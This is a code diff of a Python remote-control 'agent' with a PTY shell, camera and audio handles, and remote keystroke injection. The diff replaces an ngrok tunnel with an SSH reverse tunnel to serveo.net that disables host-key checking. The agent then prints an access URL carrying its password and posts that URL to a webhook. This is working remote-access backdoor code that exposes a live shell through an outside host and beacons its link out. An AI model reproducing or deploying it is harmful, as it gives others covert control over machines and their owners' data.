@@ -18,7 +18,7 @@ shell_fd = None
 shell_pid = None
 current_dir = os.path.expanduser("~")
 camera = None
-ngrok_url = None
+tunnel_url = None
 audio_process = None
 
 ansi_re = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
@@ -409,22 +409,35 @@ def on_remote_key(d): remote_key(d["key"])
 @socketio.on("remote:type")
 def on_remote_type(d): remote_type(d["text"])
 
-# ===== NGROK =====
-def start_ngrok():
-    global ngrok_url
+# ===== TUNNEL (serveo.net) =====
+def start_tunnel():
+    global tunnel_url
+    tunnel_url = None
     try:
-        from pyngrok import ngrok as ng
-        if NGROK_AUTH_TOKEN: ng.set_auth_token(NGROK_AUTH_TOKEN)
-        ngrok_url = ng.connect(PORT, "http").public_url
-        print(f"[+] Ngrok URL: {ngrok_url}"); return ngrok_url
-    except: pass
-    try:
-        subprocess.Popen(["ngrok", "http", str(PORT), "--log", "stdout"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(3)
-        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
-        ngrok_url = r.json()["tunnels"][0]["public_url"]
-        print(f"[+] Ngrok URL: {ngrok_url}"); return ngrok_url
-    except: return None
+        cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+               "-o", "ServerAliveInterval=30", "-R", "80:localhost:5000", "serveo.net"]
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
+
+        def reader():
+            global tunnel_url
+            for line in iter(proc.stdout.readline, ""):
+                line = line.strip()
+                if line: print("[serveo]", line)
+                m = re.search(r'https?://[a-z0-9-]+\.serveo\.net', line)
+                if m:
+                    tunnel_url = m.group()
+                    print(f"[+] Serveo URL: {tunnel_url}")
+                    return
+
+        t = threading.Thread(target=reader, daemon=True)
+        t.start()
+        for _ in range(30):
+            if tunnel_url: break
+            time.sleep(0.5)
+        return tunnel_url
+    except Exception as e:
+        print(f"[-] Tunnel error: {e}")
+        return None
 
 def send_webhook(url):
     try:
@@ -448,7 +461,7 @@ def send_webhook(url):
 if __name__ == "__main__":
     print("[+] Démarrage de l'agent Kali..."); print(f"[+] Port: {PORT}")
     start_shell(); print("[+] Shell PTY démarré")
-    url = start_ngrok()
+    url = start_tunnel()
     if url:
         print(f"[+] URL: {url}?auth={PASSWORD}")
         send_webhook(url)
